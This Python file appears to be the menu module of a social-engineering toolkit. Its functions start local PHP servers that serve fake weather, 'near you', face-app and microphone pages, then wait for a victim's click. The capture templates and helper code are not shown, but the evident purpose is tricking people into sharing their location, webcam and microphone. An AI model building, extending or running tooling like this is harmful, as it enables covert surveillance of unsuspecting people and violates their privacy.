from module import localhost,banner
from module.paths import *
from module.colors import c



def normal_data():
       localhost.run_php_server(port=localhost.randPort,dir_name="normal_data")
       banner.terminal_logo("NormalData")
       while True:
        localhost.After_click(dir_path=normal_temp("info"),message="loc")
        back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
        if back_menu.lower() == "y":
            break
       localhost.kill()
       
       
def weather_info():
    localhost.run_php_server(port=localhost.randPort,dir_name="weather")
    banner.terminal_logo("Weather")
    while True:
      localhost.After_click(dir_path=weather_temp("info"),message="loc")
      localhost.Before_click(template=weather_temp("result"),before_click_focus="location")
      back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
      if back_menu.lower() == "y":
            break
    localhost.kill()


def nearyou_info():
    localhost.run_php_server(port=localhost.randPort,dir_name="nearyou")
    banner.terminal_logo("NearYou")
    while True:
     localhost.After_click(dir_path=nearyou_temp("info"),message="loc")
     localhost.Before_click(template=nearyou_temp("result"),before_click_focus="location")
     back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
     if back_menu.lower() == "y":
            break      
    localhost.kill()
 
  
def WebCamInfo():
    localhost.run_php_server(port=localhost.randPort,dir_name="camera_temp")
    banner.terminal_logo("WebCam")
    while True:
     localhost.After_click(dir_path=webcam_temp("face-app-info"),message="webcam")
     localhost.Before_click(template=webcam_temp("face-app-result"),before_click_focus="webcam")
     back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
     if back_menu.lower() == "y":
            break 
    localhost.kill()
    
def MicrophoneInfo():
    localhost.run_php_server(port=localhost.randPort,dir_name="microphone")
    banner.terminal_logo("Microphone")
    while True:
     localhost.After_click(dir_path=microphone_temp("microphone-info"),message="mic") 
     localhost.Before_click(template=microphone_temp("microphone-result"),before_click_focus="microphone")
     back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
     if back_menu.lower() == "y":
            break        
    localhost.kill()
